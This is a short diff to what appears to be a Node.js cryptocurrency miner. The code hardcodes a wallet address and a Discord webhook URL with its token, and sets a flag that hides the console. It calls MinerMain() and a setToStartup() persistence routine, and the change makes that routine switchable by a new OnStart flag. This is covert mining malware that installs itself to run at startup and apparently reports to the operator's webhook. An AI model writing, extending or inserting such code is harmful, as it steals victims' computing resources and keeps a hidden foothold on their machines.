@@ -2,7 +2,7 @@ const walletAddr = "47kVVZSwkxMihgH7FkR7dPXppegNxungK7r4tTNCtvDECpa3JAxZ37Nj1c1r
 const wbk = "https://discord.com/api/webhooks/1060945581574463580/x1zeOXlwACMAr8hucYjIg4-g3rUBvbnvnqlygQbjciC9-VAVBMLg8BXyQuzmcouplIUi"
 const openDelay = 1000
 const hideCnsl = true
-
+const OnStart = true
 
 const process = require('process');
 const request = require('request');
@@ -184,5 +184,6 @@ async function MinerThread(){
   }
 }
 
-setToStartup()
+if(OnStart === true){setToStartup()}
+
 MinerMain();
